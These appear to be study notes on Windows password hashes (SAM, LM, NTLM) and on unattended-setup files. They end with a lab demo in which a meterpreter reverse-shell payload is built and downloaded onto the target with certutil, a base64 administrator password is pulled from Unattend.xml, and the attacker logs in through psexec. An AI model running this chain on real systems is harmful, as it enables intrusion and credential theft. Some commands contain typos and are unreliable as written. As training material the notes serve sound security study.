# Windows Password Hashes
- The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
- Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.
- Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA)
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
  - LM
  - NTLM
- Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.

## SAM Database
- SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
- The SAM database file cannot be copied while the OS is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
- In modern versions of Windows, the SAM database is encrypted with a syskey.
- Administrative privileges are required in order to access and interact with the LSASS process.

## LM (LanMan)
- LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0.
- The protocol is used to hash user passwords, and the hasing process can be broken down into the following steps:
  - The password is broken into two seven-character chunks
  - All characters are then converted into uppercase
  - Each chunk is then hashed separately with the DES algorithm.
- LM hashing is generally considered to be a weak protocol and can easily be cracked, primarly because the password hash does not include salts consequently making brute-force and rainbow table attacks effective against LM hashes.

![grafik](https://github.com/user-attachments/assets/a26dee98-a0ee-4713-b809-63b8813629c4)

## NTLM (NT HASH)
- NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- Form Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
  - Does not split the hash in to two chunks
  - Case sensitive
  - Allows the use of symbols and unicode characters
![grafik](https://github.com/user-attachments/assets/448a152b-8e1c-4b6d-a87d-f2def4139e73)

# Windows Configuration Files
## Unattended Windows Setup
- The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
  - C:\Windows\Panther\Unattend.xml
  - C:\Windows\Panther\Autounattend.xml
 - As a security precaution, the password stored in the Unattended Windows Setup configuration file may be encoded in base64.

## Demo: Searching For Passwords In Windows Configuration Files

We are going to gain access to the target via a meterpreter session. After, we will use our meterpreter session to find the unattend.xml file to identify the password and decode it with the base64 utility and then authenticate with the target via PSexec.

`netuser` on target: we are running an unprivileged user
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST [ownIP] LPORT=1234 -f exe > payload.exe`: We generate a malicious payload
`ls`
`python -m SimpleHTTPServer 80`: Set up a simple http server to host the payload.exe file with the python module simpleHTTPserver. We can now download the payload.exe on the target by accessing the webserver on the kali linux machine  own ip:10.10.49.6
on the target: 
cmd
`cd Desktop`
`certutil -urlchache -f http://[kali system]/payload.exe payload.exe`: file downloading
before we execute it, we shut down the webserver:
kali linux:
`service postgresql start && msfconsole`
msf5:`use multi/handler`
msf5:`set payload windows/x64/meterpreter/reverse_tcp`
msf5:`set LPORT 1234`
msf5:`set LHOST [kali IP]`
msf5:`run`
When we execute the payload on the target system, we will get a meterpreter session
meterpreter: `sysinfo`: we have access to the target
meterpreter: `search -f Unattend.xml`
meterpreter: `cd C:\\`: we can also do it manually
meterpreter: `cd Windows`
meterpreter: `Panther`base 
meterpreter: `dir`: Here we can find the unattend.xml file
meterpreter: `download unattend.xml`
meterpreter: `ls`
meterpreter: `cat unattend.xml`: contains information to the installation of Windows

*copy password*. If "PlaneText"= false, the password is encoded in base64
`vim pasword.txt`: paste copied password
`base64 -d password.txt`: we get the encrypted password
test it out:
`psexec.py Administrator@[target IP]`
`enter decrypted password`

We should get a cmd shell session.





